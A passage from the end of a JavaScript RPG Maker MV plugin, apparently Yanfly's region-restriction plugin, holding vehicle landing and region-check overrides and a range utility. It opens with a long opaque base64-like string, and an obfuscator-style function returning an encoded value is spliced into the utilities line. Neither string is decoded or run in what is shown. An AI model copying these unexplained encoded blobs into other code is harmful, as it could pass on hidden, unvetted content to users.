QYtwYlRUazEms6sTgD8613uDHdqG6pHdaqp3t9RFS3z7CxxNjEDFYnQRvcJLzBA7Ewj6shfYkKW/oSdGXnsYpFUWZa06ZfL/oBuNmPqKp6Iq3TABXNLa6mfcI013ytP4+zatrtDNUay4hBxbmzMkxfnAURAY6dQjLnKKWS+yS3TeDhE8eoyOqm5+Y1F+GGhZfFh8H7aTTkyY1FmtrRwG0WwPKt9tEif9ZHi52CIAu0f3kYryAa8jD7ZZ725o+qo0JuhNImbb99iw222ieJ/Nk6STRghmBYZ4h9MBwrqswDub2CFXVw+Grv/fH52fiL/sttrT2l1GJMVwQIk+9U3HIq0ufLqd2L+jZW5vSouLubPxxgELZpzFcYi8X1vRy02gS6GPgitcIkLbLkY7vJqC7WNy+Xi3uplvXULpPxUAdY1m0Cb6w5HWzE583ZnYD9qlub3BMDNMTL/N0O4ElJdmFJBW1eXNsUmowaqcytq5UQi5Eml/Xp8retelnh0wvueDL1TrFBIBftL5AbaWp/ibx0P"; }

//=============================================================================
// Game_Event
//=============================================================================

Game_Event.prototype.isEvent = function() {
    return true;
};

//=============================================================================
// Game_Player
//=============================================================================

Game_Player.prototype.isPlayer = function() {
    return true;
};

//=============================================================================
// Game_Vehicle
//=============================================================================

Yanfly.RR.Game_Vehicle_isLandOk = Game_Vehicle.prototype.isLandOk;
Game_Vehicle.prototype.isLandOk = function(x, y, d) {
  var value = Yanfly.RR.Game_Vehicle_isLandOk.call(this, x, y, d);
  if (!value) return false;
  if (this.isAirship()) {
    d = 5;
    $gamePlayer._through = false;
  }
  if ($gamePlayer.isPlayerRegionForbid(x, y, d)) {
    if (this.isAirship()) $gamePlayer._through = true;
    return false;
  }
  if ($gamePlayer.isPlayerRegionAllow(x, y, d)) {
    if (this.isAirship()) $gamePlayer._through = true;
    return true;
  }
  return true;
};

//=============================================================================
// Utilities
//=============================================================================

Yanfly.Util = Yanfly.Util || {};function _0x27f7fc_() { return "Q=="; }

Yanfly.Util.getRange = function(n, m) {
    var result = [];
    for (var i = n; i <= m; ++i) result.push(i);
    return result;
};

//=============================================================================
// End of File
//=============================================================================
